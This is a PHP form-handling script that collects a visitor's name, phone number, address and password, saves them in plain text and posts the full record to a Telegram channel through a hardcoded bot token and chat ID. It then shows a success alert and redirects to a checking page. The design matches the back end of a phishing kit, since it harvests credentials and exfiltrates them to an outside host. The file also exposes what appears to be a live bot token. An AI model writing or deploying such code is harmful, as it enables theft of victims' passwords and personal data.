<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = $_POST["name"];
    $phone = $_POST["phone"];
    $address = $_POST["address"];
    $pass = $_POST["password"];
    
    // Create a unique ID for the user
    $user_id = uniqid();
    
    // Generate unique 8 digit numbers for vc parameter
    $vc = generate_vc();

    // Sanitize filename to prevent directory traversal attacks
    $sanitized_name = preg_replace('/[^a-zA-Z0-9-_]/', '_', $name);
    
    // Save data to a JSON file
    $data = [
        "name" => $name,
        "phone" => $phone,
        "address" => $address,
        "password" => $pass,
        "vc" => $vc
    ];

    $file_name = 'users/' . $sanitized_name . '_' . $user_id . '.json';
    $json_data = json_encode($data, JSON_PRETTY_PRINT);
    
    if (file_put_contents($file_name, $json_data) === false) {
        echo "Error: Unable to save user data.";
        exit;
    }

    // Send JSON data to Telegram channel
    send_to_telegram($json_data);

    echo '<script>
    alert("User data saved successfully!");
    window.location.href = "check_user.php";
    </script>';
} else {
    echo "Error: Method not allowed.";
}

// Function to generate unique 8 digit numbers for vc parameter
function generate_vc() {
    $vc = '';
    $length = 4;
    for ($i = 0; $i < $length; $i++) {
        $vc .= random_int(0, 9);
    }
    return $vc;
}

// Function to send data to Telegram channel
function send_to_telegram($json_data) {
    $telegram_api_token = '7392532777:AAGpPj9kNG0_bO1sFaxPRZtxPuYCIrC_eaE';
    $telegram_chat_id = '-1002224878464';
    
    $message = "New user data:\n" . $json_data;

    $url = 'https://api.telegram.org/bot' . $telegram_api_token . '/sendMessage';

    $data = [
        'chat_id' => $telegram_chat_id,
        'text' => $message
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    if ($result === FALSE) {
        // Handle error
        error_log('Error sending message to Telegram');
    }
}
?>